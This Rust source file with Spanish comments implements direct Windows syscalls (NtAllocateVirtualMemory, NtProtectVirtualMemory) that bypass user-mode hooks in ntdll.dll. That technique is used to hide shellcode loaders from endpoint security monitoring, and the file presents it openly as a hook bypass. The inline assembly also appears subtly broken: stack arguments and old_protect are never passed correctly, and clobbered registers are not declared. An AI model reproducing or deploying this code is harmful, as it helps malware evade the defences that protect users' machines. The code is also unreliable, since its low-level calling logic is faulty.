// Direct Syscalls - Bypass completo de hooks en user-mode
// Ejecuta syscalls directamente sin pasar por ntdll.dll

#[cfg(target_os = "windows")]
use std::arch::asm;
#[cfg(target_os = "windows")]
use winapi::shared::ntdef::{NTSTATUS, HANDLE, PVOID};
#[cfg(target_os = "windows")]
use winapi::um::libloaderapi::{GetModuleHandleA, GetProcAddress};
#[cfg(target_os = "windows")]
use std::ffi::CString;

/// Extrae el syscall number de ntdll.dll dinámicamente
/// Esto es más confiable que hardcodear porque cambia entre versiones de Windows
#[cfg(all(target_os = "windows", target_arch = "x86_64"))]
unsafe fn get_syscall_number(func_name: &str) -> Option<u32> {
    let ntdll = CString::new("ntdll.dll").ok()?;
    let func = CString::new(func_name).ok()?;

    let ntdll_handle = GetModuleHandleA(ntdll.as_ptr());
    if ntdll_handle.is_null() {
        return None;
    }

    let func_addr = GetProcAddress(ntdll_handle, func.as_ptr());
    if func_addr.is_null() {
        return None;
    }

    // Parsear el syscall stub de ntdll
    // Formato típico en x64:
    // 4C 8B D1           mov r10, rcx
    // B8 XX 00 00 00     mov eax, SYSCALL_NUMBER
    // 0F 05              syscall
    // C3                 ret
    let bytes = std::slice::from_raw_parts(func_addr as *const u8, 32);

    // Buscar patrón: B8 XX 00 00 00 (mov eax, imm32)
    for i in 0..24 {
        if bytes[i] == 0xB8 {
            // Syscall number está en little-endian después de 0xB8
            let syscall_num = u32::from_le_bytes([
                bytes[i + 1],
                bytes[i + 2],
                bytes[i + 3],
                bytes[i + 4],
            ]);
            return Some(syscall_num);
        }
    }

    None
}

/// Ejecuta NtAllocateVirtualMemory via syscall directo
/// Bypasses TODOS los hooks en ntdll.dll
#[cfg(all(target_os = "windows", target_arch = "x86_64"))]
pub unsafe fn nt_allocate_virtual_memory(
    process_handle: HANDLE,
    base_address: *mut PVOID,
    zero_bits: usize,
    region_size: *mut usize,
    allocation_type: u32,
    protect: u32,
) -> NTSTATUS {
    // Obtener syscall number dinámicamente
    let syscall_num = match get_syscall_number("NtAllocateVirtualMemory") {
        Some(num) => num,
        None => return -1073741795, // STATUS_INVALID_PARAMETER (0xC000000D como signed)
    };

    // Wrapper interno que ejecuta el syscall
    #[allow(improper_ctypes_definitions)]
    unsafe extern "system" fn syscall_wrapper(
        syscall_num: u32,
        process_handle: HANDLE,
        base_address: *mut PVOID,
        zero_bits: usize,
        region_size: *mut usize,
        allocation_type: u32,
        protect: u32,
    ) -> NTSTATUS {
        let mut status: i32;

        // allocation_type y protect DEBEN estar en el stack
        asm!(
            "mov r10, rcx",         // Syscall convention (r10 = process_handle)
            "mov eax, edx",         // Syscall number (ya está en edx por calling convention)
            "mov rcx, r8",          // rcx = base_address (era 3er arg, ahora 1er)
            "mov rdx, r9",          // rdx = zero_bits (era 4to arg, ahora 2do)
            "mov r8, [rsp+0x28]",   // r8 = region_size (5to arg del wrapper)
            "mov r9d, [rsp+0x30]",  // r9 = allocation_type (6to arg)
            // protect queda en [rsp+0x38]
            "syscall",              // Execute
            in("rcx") process_handle,
            in("edx") syscall_num,
            in("r8") base_address,
            in("r9") zero_bits,
            lateout("eax") status,
        );

        status
    }

    // Llamar al wrapper
    syscall_wrapper(
        syscall_num,
        process_handle,
        base_address,
        zero_bits,
        region_size,
        allocation_type,
        protect,
    )
}

/// Ejecuta NtProtectVirtualMemory via syscall directo
#[cfg(all(target_os = "windows", target_arch = "x86_64"))]
pub unsafe fn nt_protect_virtual_memory(
    process_handle: HANDLE,
    base_address: *mut PVOID,
    region_size: *mut usize,
    new_protect: u32,
    old_protect: *mut u32,
) -> NTSTATUS {
    // Obtener syscall number dinámicamente
    let syscall_num = match get_syscall_number("NtProtectVirtualMemory") {
        Some(num) => num,
        None => return -1073741795, // STATUS_INVALID_PARAMETER (0xC000000D como signed)
    };

    let mut status: i32;

    asm!(
        "mov r10, rcx",
        "mov eax, {syscall:e}",
        "syscall",
        syscall = in(reg) syscall_num,
        in("rcx") process_handle,
        in("rdx") base_address,
        in("r8") region_size,
        in("r9") new_protect,
        // old_protect va en el stack
        lateout("eax") status,
        options(nostack)
    );

    status
}
